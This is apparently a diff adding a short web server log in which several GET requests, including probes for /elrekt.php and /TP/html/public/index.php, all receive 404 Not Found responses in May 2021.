+[pid: 596903|app: 0|req: 48/48] 127.0.0.1 () {30 vars in 450 bytes} [Sat May  1 01:33:27 2021] GET /TP/html/public/index.php => generated 2940 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /elrekt.php
+[pid: 596903|app: 0|req: 49/49] 127.0.0.1 () {30 vars in 422 bytes} [Sat May  1 01:33:28 2021] GET /elrekt.php => generated 2898 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /index.php
+[pid: 596903|app: 0|req: 50/50] 127.0.0.1 () {30 vars in 420 bytes} [Sat May  1 01:33:28 2021] GET /index.php => generated 2895 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 51/51] 127.0.0.1 () {30 vars in 402 bytes} [Sat May  1 01:33:28 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 52/52] 127.0.0.1 () {30 vars in 319 bytes} [Sat May  1 01:37:50 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 53/53] 127.0.0.1 () {32 vars in 451 bytes} [Sat May  1 01:46:42 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 54/54] 127.0.0.1 () {26 vars in 270 bytes} [Sat May  1 02:22:14 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 55/55] 127.0.0.1 () {32 vars in 405 bytes} [Sat May  1 02:22:15 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 56/56] 127.0.0.1 () {26 vars in 271 bytes} [Sat May  1 02:48:23 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /index.php
+[pid: 596903|app: 0|req: 57/57] 127.0.0.1 () {32 vars in 574 bytes} [Sat May  1 03:46:55 2021] GET /index.php => generated 2895 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
